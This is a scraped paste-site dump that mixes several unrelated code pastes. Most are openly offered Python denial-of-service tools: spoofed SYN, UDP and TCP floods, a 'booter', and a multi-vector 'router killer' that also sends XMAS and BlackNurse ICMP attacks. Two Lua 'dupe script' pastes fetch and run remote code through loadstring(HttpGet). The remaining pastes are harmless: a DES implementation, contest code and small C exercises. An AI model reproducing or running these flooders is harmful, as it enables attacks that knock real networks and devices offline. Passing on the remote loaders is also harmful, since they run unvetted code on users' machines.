#             DStat L4 Packet Graph (data --socket --net --tcp)

import time, sys, os
from scapy.all import *

# global variables
fake_ip = None
kb_size = None
banner = """"""\r\n\r\n\r\n 
       ▄█████████▄                                                        ███████     ███████
     ▄████▒▒▒▒▒████▄                                                      ▒▀███▀▒     ▒▀███▀▒
    ████▒▒ ███ ▒▒████  █████  █████ ███████████ █████         █████████     ███ ███████ ███
    ███▒ ███████ ▒███  ▒███▒  ▒███▒ █▀▒▒███▒▒▀█ ▒▀███         ▒███▒███▒     ███ ▒█████▒ ███
    ███  ▒▒███▒▒  ███   ███    ███  ▒   ███   ▒   ███         ███▒ ▒███     ███ ███▒███ ███
   █████   ███   █████  ███    ███      ███       ███       █████████████  ███████▒ ▒███████
   ▒███▒   ███   ▒███▒  ▒███  ███▒      ███       ███    ▄█ ▒███▒▒▒▒▒███▒  ▒█████▒   ▒█████▒
    ▒▀████ ▒▒▒ ████▀▒    ▒▀████▀▒      █████     ██████████ █████   █████  ▄████▒     ▒████▄
      ▒▀█████████▀▒        ▒▒▒▒        ▒▒▒▒▒     ▒▒▒▒▒▒▒▒▒▒ ▒▒▒▒▒   ▒▒▒▒▒ ███████     ███████
        ▒▒▒▒▒▒▒▒▒                                                         ▒▒▒▒▒▒▒     ▒▒▒▒▒▒▒
""""""

def spoofIPV4(fake_ip):
    fake_ip = ""."".join(str(random.randint(0, 255)) for _ in range(4))
    return fake_ip

def genJunk(kb_size):
    x = ''.join(random.choices(string.ascii_letters + string.digits, k=int(kb_size)))
    return str(x)

def _DoWork(ipaddr, prt, kbs, durat):
    # verbose prompt
    print(banner)
    print("" CTRL + C to quit...\r\n"")
    print("" Hulking out on "" + ipaddr + "":"" + prt + "" with hunnitz of SYN packets for "" + durat + "" seconds!\r\n"")
    endTime = time.time() + int(durat)

    while time.time() < endTime:
        try:
            # spoof sender from subnet
            # ip = IP(src=RandIP(""192.168.1.1/24""), dst=target_ip)
            gen_ip = spoofIPV4(fake_ip)
            
            # build TCP-SYN packet
            tcp = TCP(sport=RandShort(), dport=prt, flags=""S"")
            
            # generate payload / stack layers
            kb_size = kbs
            payload = genJunk(kb_size).encode()
            
            #payload = Raw(b""X""*int(kbs))
            p = gen_ip / tcp / payload
            
            # reign hell
            send(p, verbose=False)
            
        except KeyboardInterrupt:
            sys.exit(""\r\n\r\n   DoS aborted by user!"")

    sys.exit(""\r\n\r\n   DoS complete!"")

def main():
    # display syntax information
    if len(sys.argv) == 1 or sys.argv[1].lower() == ""-h"":
        print(""\r\n"" + banner + ""\r\n"")
        print(""""""\r\n\t!!! SYN ATTACK SCRIPT !!!\r\n
\tSYNTAX : """""" + os.path.basename(__file__).upper() + """""" <IP> <PORT> <MAX KB SIZE> <DURATION IN SEC>\r\n
\t!!! MUST BE EXECUTED AS ROOT !!!\r\n"""""")
    else:
        # check for elevation before execution  /  not geteuid() == 0
        priv = os.getenv(""SUDO_USER"")
        if priv is None:
            sys.exit(""\r\n\tScript requires root elevation!\r\n"")
        _DoWork(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])

if __name__ == ""__main__"":
    main()"
m9d4jTSM,Pet Sim 99 Dupe Script [ANY PET] Newest Update,quikzyYTbtw,Lua,Saturday 16th of March 2024 09:48:25 AM CDT," 
--UPDATED VERSION OF MY DUPE SCRIPT THATS WORKS IN THE NEWEST UPDATE IN PET SIM 99-- UPDATED 3/16/2024
 
--FIXED SOME BUGS AND ADDED SOME MORE FEATURES AND HELPFUL GUIDES!--EXECUTE THE SCRIPT AND JUST FOLLOW THE INSTRUCTIONS-- HAVE FUN!
 
--(IT CAN ALSO DUPE TITANICS AND HUGES FROM YOUR BANK AND INVENTORY)--


loadstring(game:HttpGet(""https://raw.githubusercontent.com/zerqhy/petsim99/main/script-main""))()"
bp5jzWir,router_killer.py,betrayed,Python,Saturday 16th of March 2024 09:47:32 AM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys, time, socket, string, threading
from random import *
from scapy.all import *

# coded by betrayed - 04/11/2024
# Multi-vector DDOS script --- takes down Routers and other IoT devices
# Sends 4 concurrent attacks at once:
#                    SPOOFED UDP : volumetric packet flood
#                    SPOOFED SYN : Protocol exhaustion
#                    BLACK NURSE : ICMP exploit that targets the firewall
#                           XMAS : aka 'TCP ALL-FLAG' attack. Also targets firewall

killSwitch = False

def _xmas():
    while True:
        try:
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)

            IP_Packet = IP ()
            IP_Packet.src = ""."".join(map(str, (randint(0,255)for _ in range(4))))
            IP_Packet.dst = sys.argv[1]

            TCP_Packet = TCP ()	
            TCP_Packet.sport = s_port
            TCP_Packet.dport = int(sys.argv[2])
            TCP_Packet.flags = ""FSRPAUEC""
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            send(IP_Packet/TCP_Packet, verbose=0)
            if killSwitch:
                break
        except:
            pass

def _ssyn():
    while True:
        try:
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)

            IP_Packet = IP ()
            IP_Packet.src = ""."".join(map(str, (randint(0,255)for _ in range(4))))
            IP_Packet.dst = sys.argv[1]

            TCP_Packet = TCP ()	
            TCP_Packet.sport = s_port
            TCP_Packet.dport = int(sys.argv[2])
            TCP_Packet.flags = ""S""
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            send(IP_Packet/TCP_Packet, verbose=0)
            if killSwitch:
                break
        except:
            pass

def _sudp():
    while True:
        try:
            # generate fake ip
            fakeSrc = ""."".join(map(str, (randint(0,255)for _ in range(4))))
            
            # select random src port
            src_port = int(RandShort())
            
            # generate data buffer
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=int(4096)))
            
            # craft and send packet
            packet = IP(src=fakeSrc, dst=sys.argv[1]) / UDP(sport=src_port, dport=port) / payload
            send(packet, verbose=False)
            if killSwitch:
                break
        except:
            pass

def _icmp():
    while True:
        try:
            fakeSrc = ""."".join(map(str, (randint(0,255)for _ in range(4))))
            
            socket = conf.L2socket(iface=""eth0"")
            send(IP(dst=sys.argv[1],src=fakeSrc)/ICMP(type=3,code=3), verbose=0)
            if killSwitch:
                break
        except:
            pass

def main():
    if len(sys.argv) != 4:
        sys.exit(""\r\n   SYNTAX: <IP> <PORT> <TIME>\r\n"")
        
    if not 'SUDO_UID' in os.environ:
        sys.exit(""\r\n   Script requires root elevation!\r\n"")
    
    global killSwitch
        
    print(""""""\r\n\r\n\r\n\r\n\r\n\r\n
  ███                     █ █
 ░█░█          █  ▄▄▄    ░█░█         ▄▄▄
 ░██  ███ █ █ ███░█▀▀ ██ ░██  █ █  █ ░█▀▀ ██
 ░█░█░█░█░█░█░░█ ░█▀ ░█  ░█░█░▄░█ ░█ ░█▀ ░█
 ░█░█░███░███ ░██░███░█  ░█░█░█░██░██░███░█
 ░ ░ ░░░ ░░░  ░░ ░░░ ░   ░ ░ ░ ░░ ░░ ░░░ ░                                              
"""""")
    print("" Obliterating router for "" + sys.argv[3] + "" seconds...\r\n"")
    t1 = threading.Thread(target = _sudp)
    t2 = threading.Thread(target = _ssyn)
    t3 = threading.Thread(target = _xmas)
    t4 = threading.Thread(target = _icmp)
    t1.start()
    print(""sudp UP!"")
    t2.start()
    print(""ssyn UP!"")
    t3.start()
    print(""xmas UP!"")
    t4.start()
    print(""blacknurse UP!"")
    
    stopAt = time.time() + int(sys.argv[3])
    try:
        while time.time() < stopAt:
            pass
    except KeyboardInterrupt:
        killSwitch = True
     
    killSwitch = True
    t1.join()
    t2.join()
    t3.join()
    t4.join()
    
    sys.exit(""\r\nJob complete!\r\n"")
    
if __name__ == ""__main__"":
    main()
"
t81Dv1uF,Pet Sim 99 UPDATES SCRIPT GUI,quikzyYTbtw,Lua,Saturday 16th of March 2024 09:45:14 AM CDT," 
--MY NEW UPDATED SCRIPT GUI VERSION FOR THE NEWEST PET SIM 99 UPDATE-- UPDATED 3/16/2024
 
--ADDED SOME SMALL NEW FEATURES FOR THE UPCOMING UPDATE AND FIXED SOME BUGS!--

--ALSO ADDED FEATURES LIKE SNIPER BOOTH, AUTO DIAMOND FARM, ETC!-- 
 
--JUST EXECUTE THE SCRIPT ON ANY EXECUTOR LIKE CODEX, ARCEUS X etc.

loadstring(game:HttpGet(""https://raw.githubusercontent.com/zerqhy/petsim99/main/script-main""))()

  "
McsmdMSq,s7n.py,betrayed,Python,Saturday 16th of March 2024 09:43:45 AM CDT,"#!/usr/bin/env python3
# coded by betrayed
# udp / tcp flood
import sys, time, socket
from colorama import Fore

kill = 0
data = """"

def _udp():
    while time.time() < kill:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((sys.argv[1], int(sys.argv[2])))
            s.send(data.encode())
            
            while time.time() < kill:
                s.send(data.encode())
            
            s.close()
        except KeyboardInterrupt:
            sys.exit(""\r\nJob aborted.\r\n"")
        except:
            pass
    
    sys.exit(""\r\nJob complete!\r\n"")

def _tcp():
    while time.time() < kill:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((sys.argv[1], int(sys.argv[2])))
            s.send(data.encode())
            
            while time.time() < kill:
                s.send(data.encode())
            
            s.close()
        except KeyboardInterrupt:
            sys.exit(""\r\nJob aborted.\r\n"")
        except:
            pass
    
    sys.exit(""\r\nJob complete!\r\n"")

def main():
    if len(sys.argv) != 6:
        sys.exit(""\r\n   SYNTAX: <IP> <PORT> <SIZE> <TIME> <UDP/TCP>\r\n"")

    global data, kill
    while len(data) != int(sys.argv[3]):
        data = data + ""7""
    
    print(Fore.BLUE + """"""\r\n\r\n\r\n\r\n\r\n\r\n
  ######## ######  ####     ##       ######                       ##                 
 ##////// //////# /##/##   /##      /#////##                     /##                 
/##            /# /##//##  /##      /#   /##   ######   ######  ######  #####  ######
/#########     #  /## //## /##      /######   ##////## ##////##///##/  ##///##//##//#
////////##    #   /##  //##/##      /#//// ##/##   /##/##   /##  /##  /####### /## / 
       /##   #    /##   //####      /#    /##/##   /##/##   /##  /##  /##////  /##   
 ########   #     /##    //###      /####### //###### //######   //## //######/###   
////////   /      //      ///       ///////   //////   //////     //   ////// ///    
"""""")
    print(""Disintegrating "" + sys.argv[1] + "" @ "" + sys.argv[2] + "" with "" + sys.argv[3] + "" bytes for "" + sys.argv[4] + "" seconds...\r\n"")

    kill = time.time() + int(sys.argv[4])
    
    if sys.argv[5].lower() == ""tcp"":
        _tcp()
    else:
        _udp()

if __name__ == ""__main__"":
    main()

"
Z3K1ahT0,stinger.py,betrayed,Python,Saturday 16th of March 2024 09:42:42 AM CDT,"# -*- coding: utf-8 -*-

# Spoofed UDP attack script
# Coded by betrayed
# Tested on : Debian 12.4.0
#             Kali Linux 2023.4
#             Windows 11, 23H2 [OS build 22631.2861]
#             CentOS 8.0-1905
#             Ubuntu Server 23.10

import sys, os, platform
import time, errno, random, string, socket
from scapy.all import *

# global variables
fake_ip = None
kb_size = None
banner = """"""\r\n\r\n\r\n
              ██      ██
             ░██     ░░
   ███████  ██████    ██  ███████    ██████    ██████   ███████
  ██░░░░░  ░░░██░    ░██ ░██░░░░██  ██░░░░██  ██░░░░██ ░██░░░░██
 ░░██████    ░██     ░██ ░██   ░██ ░██ ██░██ ░████████ ░██   ░░
  ░░░░░░██   ░██  ██ ░██ ░██   ░██ ░██░░ ░██ ░██       ░██
  ███████    ░░████  ░██ ░██   ░██ ░░███████ ░░███████ ░██
 ░░░░░░░      ░░░░   ░░  ░░    ░░   ░░░░░░██  ░░░░░░░  ░░
                                    ██   ░██
                                   ░░██████
                                    ░░░░░░
""""""

def spoofIPV4(fake_ip):
    fake_ip = ""."".join(str(random.randint(0, 255)) for _ in range(4))
    return fake_ip

def genJunk(kb_size):
    x = ''.join(random.choices(string.ascii_letters + string.digits, k=int(kb_size)))
    return str(x)
    
def _DoWork(ipaddr, prt, kbs, durat):
    # verbose prompt
    print(banner)
    print("" CTRL + C to quit...\r\n"")
    print("" Disintegrating "" + ipaddr + "" on port "" + prt + "" with "" + kbs + "" bytes for "" + durat + "" seconds!\r\n"")
    
    endTime = time.time() + int(durat)
    while time.time() < endTime:
        try:
            # generate fake ip
            gen_ip = spoofIPV4(fake_ip)
            
            # select random src port
            src_port = int(RandShort())
            
            # generate data buffer
            kb_size = kbs
            payload = genJunk(kb_size)
            
            # craft and send packet
            packet = IP(src=gen_ip, dst=ipaddr) / UDP(sport=src_port, dport=port) / payload
            send(packet, verbose=False)
            
        except KeyboardInterrupt:
            sys.exit(""\r\n\r\n DoS aborted by user!"")

    sys.exit(""\r\n\r\n DoS complete!"")

def main():
    # display syntax information
    if not len(sys.argv) == 5:
        print(""\r\n   SYNTAX: <IP> <PORT> <SIZE> <TIME>\r\n"")
    else:
        ## check for elevation before execution
        priv = os.getenv(""SUDO_USER"")
        if priv is None:
            sys.exit(""\r\n\tScript requires root elevation!\r\n"")
        _DoWork(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])

if __name__ == ""__main__"":
    main()
"
sedEWMQM,true_booter.py,betrayed,Python,Saturday 16th of March 2024 09:40:52 AM CDT,"#!/usr/bin/env python3

import socket
import time
import sys
import string
import random

# Programmed by betrayed 03/03/2024
# Primitive Denial-of-Service script written in Python.
# Supports transport-layer floods via TCP and UDP protocols.

# Tested on: Ubuntu server 22.04.3 (GNU/Linux 5.15.0-91-generic x86_64)
#            Windows 11, Home Edition.
#            CentOS

# Traffic confirmed via: Wireshark
#			 dstat --net --udp --tcp --socket
data = ''
banner = """"""\r\n\r\n\r\n\r\n\r\n\r\n\r\n
 **********                           ******                          **  
/////**///                           /*////**                        /**  
    /**    ******  **   **   *****   /*   /**    ******    ******   ******
    /**   //**//* /**  /**  **///**  /******    **////**  **////** ///**/ 
    /**    /** /  /**  /** /*******  /*//// ** /**   /** /**   /**   /**  
    /**    /**    /**  /** /**////   /*    /** /**   /** /**   /**   /**  
    /**    /**    //***** //******   /*******  //******  //******   //** 
    //     ///     //////   //////   ///////    //////    //////     //  
""""""

def _floodUdp():
    stopAt = time.time() + int(sys.argv[3])
    while time.time() < stopAt:
        try:        
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(data.encode(), (sys.argv[1], int(sys.argv[2])))
            
            while time.time() < stopAt:
                x = data.join(random.choices(string.ascii_letters + string.digits, k=int(4096)))
                s.sendto(x.encode(), (sys.argv[1], int(sys.argv[2])))
                
        except KeyboardInterrupt:
            s.close()
            sys.exit(""\r\nJob aborted by user.\r\n"")
        except:
            pass
            
    sys.exit(""\r\nJob complete!\r\n"")

def _floodTcp():
    stopAt = time.time() + int(sys.argv[3])
    while time.time() < stopAt:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((sys.argv[1], int(sys.argv[2])))
            s.send(data.encode())

            while time.time() < stopAt:
                x = data.join(random.choices(string.ascii_letters + string.digits, k=int(4096)))
                s.send(x.encode())

            s.close()
        except KeyboardInterrupt:
            s.close()
            sys.exit(""\r\nJob aborted by user.\r\n"")
        except:
            pass
           
    sys.exit(""\r\nJob complete!\r\n"")
    
def _doWork():
    if not len(sys.argv) == 5:
        sys.exit(""\r\n    SYNTAX: python trueboot.py <IP> <PORT> <TIME> <TCP or UDP>\r\n"")
    
    print(banner)
    print(""Getting rid of "" + sys.argv[1] + "" @ "" + sys.argv[2] + "" for "" + sys.argv[3] + "" seconds...\r\n"")
    
    if sys.argv[4].lower() == ""udp"":
        _floodUdp()
    else:
        _floodTcp()
    
if __name__ == ""__main__"":
    _doWork()
"
LQQF8QWc,Untitled,Josif_tepe,C++,Saturday 16th of March 2024 09:38:19 AM CDT,"#include <bits/stdc++.h>
 
using namespace std;
typedef long long ll;
int main() {
    ios_base::sync_with_stdio(false);
    int n, k, s;
    cin >> n >> k >> s;

    vector<int> v(n);
    for(int i = 0; i < n; i++) {
        cin >> v[i];
    }
    ll sum = 0;
    for(int i = 0; i < k - 1; i++) {
        sum += v[i];
    }
    int j = 0;
    vector<pair<ll, int>> max_sums;
    for(int i = k - 1; i < n; i++) {
        sum += v[i];
        max_sums.push_back(make_pair(sum, j));
        sum -= v[j];
        j++;
    }

    sort(max_sums.rbegin(), max_sums.rend());
    ll res = 0;
    int till = min((int) max_sums.size(), 7000);
    for(int i = 0; i < till; i++) {
        ll tmp_sum = 0;
        for(j = max_sums[i].second + s - 1; j <= max_sums[i].second + k - 1; j += s) {
            
            tmp_sum += v[j];
        }
        res = max(res, max_sums[i].first - tmp_sum);        
    }
    cout << res << endl;



     
    return 0;
}
"
caR7eGjP,multi-thread_for_duration.py,betrayed,Python,Saturday 16th of March 2024 09:38:00 AM CDT,"import sys, time, threading
_abort = False

def _doWork():
    while True:
        print(""Thread/s active!"")
        if _abort == True:
            break
        
def main():
    tasks = []
    
    print(""Starting thread/s...\r\n"")
    
    global _abort
    thread_count = 5
    
    i = 0
    while True:
        i +=1
        x = threading.Thread(target = _doWork)
        tasks.append(x)
        x.start()
        if i == thread_count:
            break
    
    # let threads run for 30 seconds
    _end = time.time() + 30
    
    try:
        while time.time() < _end:
            pass
    except KeyboardInterrupt:
        pass #user hit CTRL+C
    
    _abort = True
    
    for y in tasks:
        y.join()
    
    sys.exit(""\r\nOperation complete!\r\n"")
    
if __name__ == ""__main__"":
    main()
"
z0G1eAa6,DES Algorithm,penguin71630,C++,Saturday 16th of March 2024 09:15:04 AM CDT,"#include <bits/stdc++.h>
using namespace std;

#define fastio ios_base::sync_with_stdio(false); cin.tie(0);
#define endl '\n'


typedef long long ll;
typedef unsigned long long ull;
typedef pair<int, int> pii;
typedef pair<ll, ll> pll;


/* ============================================= */

template<typename T>
void reset(vector<T>& v, int n) {v.clear(); v.resize(n);}

template<typename T>
void reset(vector<T>& v, int n, T x) {v.clear(); v.resize(n, x);}


#define iter(v) v.begin(), v.end()
#define SZ(v) (int)v.size()
#define topos(a) ((a) = (((a) % MOD + MOD) % MOD))

template<typename T1, typename T2>
istream operator>>(istream& is, pair<T1, T2>& p) {
    return is >> p.first >> p.second;
}

template<typename T>
istream& operator>>(istream& is, vector<T>& v) {
    for (auto& x : v)
        is >> x;
    return is;
}

template<typename T>
ostream& operator<<(ostream& os, const vector<T>& v) {
    for (const auto& x : v)
        os << x << ' ';
    return os;
}

void _debug() {}
template<typename A,typename... B> void _debug(A a,B... b){
    cerr<<a<<' ',_debug(b...);
}
#define debug(...) cerr<<#__VA_ARGS__<<"": "",_debug(__VA_ARGS__),cerr<<endl;
template<typename T>


mt19937 rng(chrono::steady_clock::now().time_since_epoch().count());
#define RAND(a,b) uniform_int_distribution<int> (a, b)(rng) // inclusive


/* ============================================= */


const vector<int> IP = { 58, 50, 42, 34, 26, 18, 10, 2,
                             60, 52, 44, 36, 28, 20, 12, 4,
                             62, 54, 46, 38, 30, 22, 14, 6,
                             64, 56, 48, 40, 32, 24, 16, 8,
                             57, 49, 41, 33, 25, 17, 9, 1,
                             59, 51, 43, 35, 27, 19, 11, 3,
                             61, 53, 45, 37, 29, 21, 13, 5,
                             63, 55, 47, 39, 31, 23, 15, 7 };

const vector<int> IP_inv = { 40, 8, 48, 16, 56, 24, 64, 32,
                           39, 7, 47, 15, 55, 23, 63, 31,
                           38, 6, 46, 14, 54, 22, 62, 30,
                           37, 5, 45, 13, 53, 21, 61, 29,
                           36, 4, 44, 12, 52, 20, 60, 28,
                           35, 3, 43, 11, 51, 19, 59, 27,
                           34, 2, 42, 10, 50, 18, 58, 26,
                           33, 1, 41, 9, 49, 17, 57, 25 };

const vector<int> E = { 32, 1, 2, 3, 4, 5, 4, 5,
                      6, 7, 8, 9, 8, 9, 10, 11,
                      12, 13, 12, 13, 14, 15, 16, 17,
                      16, 17, 18, 19, 20, 21, 20, 21,
                      22, 23, 24, 25, 24, 25, 26, 27,
                      28, 29, 28, 29, 30, 31, 32, 1 };


const vector<vector<vector<int>>> S = {
    {   {14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7},
        {0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8},
        {4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0},
        {15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13} },

    {   {15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10},
        {3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5},
        {0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15},
        {13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9} },

    {   {10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8},
        {13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1},
        {13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7},
        {1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12} },

    {   {7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15},
        {13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9},
        {10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4},
        {3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14} },

    {   {2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9},
        {14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6},
        {4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14},
        {11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3} },

    {   {12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11},
        {10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8},
        {9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6},
        {4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13} },

    {   {4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1},
        {13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6},
        {1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2},
        {6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12} },

    {   {13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7},
        {1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2},
        {7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8},
        {2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11} }
};

const vector<int> P = { 16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10,
                      2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25 };

const vector<int> PC_1 = { 57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18,
                     10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36,
                     63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22,
                     14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4 };

const vector<int> PC_2 = { 14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10,
                         23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2,
                         41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48,
                         44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32 };

const vector<int> shift = { 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1 };



// IP, IP_inv, E, P, PC_1, PC_2, shift


ull str_to_ull(string s) {
    ull res = 0;
    for (auto& c : s)
        res = (res << 8) | c;
    return res;
}

string ull_to_bin(ull x) {
    string res = """";
    for (int i = 0; i < 64; i++, x >>= 1)
        res.push_back((x & 1) ? '1' : '0');
    reverse(iter(res));
    return res;
}

string ull_to_hex(ull x) {
    string res = """";
    for (int i = 0; i < 16; i++, x >>= 4)
        res.push_back((x & 15) < 10 ? '0' + (x & 15) : 'A' + (x & 15) - 10);
    reverse(iter(res));
    return res;
}

void output_bin(string s, int align=4, int len=64) {
    int cnt = 0;
    for (int i = (int)s.size() - len; i < (int)s.size(); i++) {
        cerr << s[i]; cnt++;
        if (cnt % align == 0) {
            cnt = 0;
            cerr << ' ';
        }
    }
    cerr << endl;
}

ull __permutation(ull x, const vector<int>& _P, int len) {
    ull res = 0;
    for (auto& b : _P)
        res = (res << 1) | ((x >> (len - b)) & 1);
    return res;
}

ull __left_rot(ull x, int len, int b) {
    return ((1<<len) - 1) & ((x << b) | (x >> (len - b)));
}

ull __next_key(int round, ull K) {
    ull c = K >> 28;
    ull d = K & ((1<<28) - 1);
    c = __left_rot(c, 28, shift[round - 1]);
    d = __left_rot(d, 28, shift[round - 1]);
    ull res = (c << 28) | d;
    return res;
}

ull __f(ull R, ull K) {
    // Expansion
    R = __permutation(R, E, 32);

    // XOR with K
    R ^= K;
    
    //cerr << "">>> "";
    //output_bin(ull_to_bin(R), 6, 48);
    
    // S-box
    ull tmp = 0;
    vector<int> res;
    for (int i = 7; i >= 0; i--) {
        ull blk = R & 0b111111; R >>= 6;
        int c = (blk & 0b011110) >> 1;
        int r = ((blk & 0b100000) >> 4) | (blk & 0b000001);
        res.emplace_back(S[i][r][c]);
    }
    reverse(iter(res));
    for (auto& i : res)
        tmp = (tmp << 4) | i;
    R = tmp;

    //cerr << "">>> "";
    //output_bin(ull_to_bin(R), 4, 32);
    
    // Permutation
    R = __permutation(R, P, 32);

    return R;
}

ull DES(ull K, ull M) {
    // Initial Permutation
    M = __permutation(M, IP, 64);

//cerr << "" IP: "" << ull_to_bin(M) << endl;

    // Key PC1
    K = __permutation(K, PC_1, 64);

//cerr << ""PC1: "" << ull_to_bin(K) << endl;

    // 16 round Feistel process
    for (int round = 1; round <= 16; round++) {
        K = __next_key(round, K);
//cerr << ""K"" << round << "" = ""; output_bin(ull_to_bin(__permutation(K, PC_2, 56)), 6, 48);
        ull L = M >> 32;
        ull R = M & ((1uLL<<32) - 1);
        ull nL = R;
        ull nR = L ^ __f(R, __permutation(K, PC_2, 56));
        M = (nL << 32) | nR;
//cerr << ""L"" << round << "" = ""; output_bin(ull_to_bin(nL), 4, 32);
//cerr << ""R"" << round << "" = ""; output_bin(ull_to_bin(nR), 4, 32);
    }
    ull L = M >> 32;
    ull R = M & ((1LL<<32) - 1);
    M = (R << 32) | L;

    // Inverse Permutation
    M = __permutation(M, IP_inv, 64);

    return M;
}




void init() {
    ;
}


ull K, M, C;

void input() {

    string sK, sM;
    cin >> sK >> sM;
    K = str_to_ull(sK);
    M = str_to_ull(sM);

/*
output_bin(ull_to_bin(M));
output_bin(ull_to_bin(__permutation(M, IP, 64)));

K = __permutation(K, PC_1, 64);
cerr << ""K0 = ""; output_bin(ull_to_bin(__permutation(K, PC_2, 56)), 6, 48);
ull tmp = K;
for (int round = 1; round <= 16; round++) {
    tmp = __next_key(round, tmp);
    cerr << ""K"" << round << "" = "";
    output_bin(ull_to_bin(__permutation(tmp, PC_2, 56)), 6, 48);
}
exit(0);
*/


}


void solve() {

    C = DES(K, M);
    cout << ull_to_hex(C) << endl;

}


int main() {
    fastio

    init();

int TEST = 5;
//cin >> TEST;

for (int _ti = 1; _ti <= TEST; _ti++) {
    input();
    solve();
}

    return 0;
}"
6XgvQSL9,Untitled,dllbridge,C,Saturday 16th of March 2024 08:31:28 AM CDT,"

#include  <stdio.h>

void foo();
 
 
////////////////////////////////////////////
int main()
{
    foo();
}
 
 
 

 ///////////////////////////////////////////// 
void foo()                                  //
{
			
   int  marray[10]={25,50,65,-31,75,2000000000,10, 14},
        i = 0;

name:   i = i + 1;

        printf(""  array[%d]=  %d\n"",i  ,marray[i]);
        
        if(i<7) goto name;	
}
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

/*
#include   <stdio.h>

 int nArr[77] = {1, 22, 25, 35, 5, 55, 105, 10000, 100000};

/////////////////////////////////
int main()                    // 
{
    
   
    
    for(int i = 0; i < 10; i++)
	{
		
	   printf(""nArr[%d] = %d\n"", i, nArr[i]);	
	   
	   nArr[i] = i;
	} 
	
    printf("" - - - - - - - - - - - \n""); 
    
    for(int i = 0; i < 10; i++)
	{
		
	   printf(""nArr[%d] = %d\n"", i, nArr[i]);	
	}	
   
}




*/






/*
#include   <stdio.h>

 int nArr[77];

/////////////////////////////////
int main()                    // 
{
    
   
    
    for(int i = 0; i < 10; i++)
	{
		
	   printf(""nArr[%d] = %d\n"", i, nArr[i]);	
	   
	   nArr[i] = i;
	} 
	
    printf("" - - - - - - - - - - - \n""); 
    
    for(int i = 0; i < 10; i++)
	{
		
	   printf(""nArr[%d] = %d\n"", i, nArr[i]);	
	}	
   
}


*/
























/*

#include   <stdio.h>



/////////////////////////////////
int main()                    // 
{

    int n = 0; 
   
    printf(""START n = %d\n"", n);
   
name:  n -= 1;
   
       printf(""n = %d\n"", n); 
      
       if(n > -7) goto name;
   
}





*/


"
